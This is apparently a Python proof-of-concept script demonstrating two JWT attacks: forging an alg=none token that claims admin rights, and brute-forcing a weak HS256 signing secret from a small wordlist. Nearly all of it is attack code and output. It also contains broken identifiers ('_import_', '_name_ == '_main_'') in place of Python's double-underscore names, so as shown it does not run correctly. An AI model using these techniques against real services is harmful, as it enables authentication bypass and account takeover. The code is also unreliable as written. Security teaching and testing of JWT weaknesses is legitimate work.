#!/usr/bin/env python3
"""
jwt_attack_demo.py
PoC for JWT attacks (educational use only).
- Demonstrates an alg=none forgery against a naive verifier example.
- Demonstrates brute-force of weak HS256 secret (small wordlist).
Usage:
  python3 jwt_attack_demo.py --demo none
  python3 jwt_attack_demo.py --demo brute
Note: This script is for defensive/research purposes only.
"""
import argparse
import jwt
import base64
import json

# Small helper to pretty print tokens
def split_token(tok):
    parts = tok.split('.')
    dec = []
    for p in parts:
        # pad
        pad = '=' * (-len(p) % 4)
        try:
            s = base64.urlsafe_b64decode(p + pad).decode('utf-8')
        except Exception:
            s = '<binary>'
        dec.append(s)
    return parts, dec

# ---------------------- Demo 1: alg=none ----------------------
def demo_alg_none():
    print("=== Demo: alg=none forgery against a naive verifier ===")
    header = {"alg": "none", "typ": "JWT"}
    payload = {"sub": "admin", "username": "attacker", "iat": int(_import_('time').time())}
    header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip("=")
    payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=")
    token = header_b64 + "." + payload_b64 + "."  # empty signature per alg=none
    print("Forged token (alg=none):")
    print(token)
    print("\nDecoded header/payload:")
    parts, dec = split_token(token)
    print("Header:", dec[0])
    print("Payload:", dec[1])
    print("\nIf a server accepts this token without verifying algorithm or signature, it is compromised.\n")
    print("Now: demo a naive verification that is vulnerable (for educational use):")
    try:
        # intentionally unsafe: do NOT use in production
        decoded = jwt.decode(token, options={"verify_signature": False})
        print("Vulnerable verifier returned:", decoded)
    except Exception as e:
        print("Error during decode (expected on secure setups):", e)
    print("=== End alg=none demo ===\n\n")

# ---------------------- Demo 2: Weak HS256 brute-force ----------------------
def demo_bruteforce():
    print("=== Demo: Brute-force weak HS256 secret ===")
    # Simulate a token signed with a weak secret
    secret = "password123"  # WEAK secret (attacker shouldn't know)
    original_payload = {"sub": "victim", "role": "user"}
    token = jwt.encode(original_payload, secret, algorithm="HS256")
    if isinstance(token, bytes):
        token = token.decode()
    print("Target token:", token)
    print("Attempting brute-force using small wordlist...")
    # small wordlist
    wordlist = ["123456", "password", "password123", "admin", "letmein", "secret", "qwerty", "jwtsecret"]
    found = None
    for w in wordlist:
        try:
            decoded = jwt.decode(token, w, algorithms=["HS256"], options={"verify_signature": True})
            print(f"[+] Secret found: {w}")
            print("Decoded payload:", decoded)
            found = w
            break
        except Exception:
            print(f"[-] Tried {w}: failed")
    if not found:
        print("Secret not found in small wordlist. In real brute-force, attacker may use larger lists or GPU cracking.")
    print("=== End brute-force demo ===\n\n")

def main():
    parser = argparse.ArgumentParser(description="JWT attack demos (educational)")
    parser.add_argument('--demo', choices=['none', 'brute', 'all'], default='all', help="Which demo to run")
    args = parser.parse_args()
    if args.demo in ('none', 'all'):
        demo_alg_none()
    if args.demo in ('brute', 'all'):
        demo_bruteforce()

if _name_ == '_main_':
    main()
